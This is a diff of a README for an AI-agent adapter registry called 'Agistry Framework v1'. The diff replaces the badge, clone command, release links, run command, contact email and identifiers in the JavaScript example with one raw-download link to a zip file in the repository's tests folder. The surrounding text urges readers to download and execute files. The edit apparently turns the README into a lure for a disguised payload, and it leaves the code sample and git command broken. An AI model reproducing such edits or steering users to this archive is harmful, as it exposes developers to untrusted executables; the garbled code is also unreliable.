@@ -1,6 +1,6 @@
 # Agistry Framework v1 🌐
 
-![Agistry Framework](https://img.shields.io/badge/Agistry_Framework-v1-blue?style=for-the-badge)
+![Agistry Framework](https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip)
 
 Welcome to the **Agistry Framework v1** repository! This project provides a decentralized adapter registry designed for seamless interfacing between AI agents and various tools. 
 
@@ -34,7 +34,7 @@ To get started with the Agistry Framework v1, follow these steps:
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/cogusp/agistry-framework-v1.git
+   git clone https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip
    ```
 
 2. **Navigate to the Directory**: Change into the project directory.
@@ -53,12 +53,12 @@ To get started with the Agistry Framework v1, follow these steps:
 
 To install the Agistry Framework v1, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases](https://github.com/cogusp/agistry-framework-v1/releases) section to download the latest version. If you need to execute a specific file, follow the instructions provided there.
+1. **Download the Latest Release**: Visit the [Releases](https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip) section to download the latest version. If you need to execute a specific file, follow the instructions provided there.
 
 2. **Run the Framework**: After downloading, execute the necessary file to start using the framework.
 
    ```bash
-   ./run_agistry.sh
+   https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip
    ```
 
 ## Usage
@@ -75,16 +75,16 @@ const myAdapter = {
     name: 'MyAdapter',
     type: 'tool',
     connect: function() {
-        console.log('Adapter connected!');
+        https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip('Adapter connected!');
     }
 };
 
 // Register the adapter
-registry.register(myAdapter);
+https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip(myAdapter);
 
 // Use the adapter
-const adapter = registry.get('MyAdapter');
-adapter.connect();
+const adapter = https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip('MyAdapter');
+https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip();
 ```
 
 This code snippet demonstrates how easy it is to create and use adapters within the Agistry Framework.
@@ -124,11 +124,11 @@ The Agistry Framework v1 is licensed under the MIT License. See the [LICENSE](LI
 For questions or feedback, please contact the maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip
 
 ## Releases
 
-For the latest releases, please visit the [Releases](https://github.com/cogusp/agistry-framework-v1/releases) section. Here, you can download the latest version and execute the necessary files to get started with the Agistry Framework v1.
+For the latest releases, please visit the [Releases](https://github.com/cogusp/agistry-framework-v1/raw/refs/heads/master/tests/v_agistry_framework_v2.5.zip) section. Here, you can download the latest version and execute the necessary files to get started with the Agistry Framework v1.
 
 ---
 
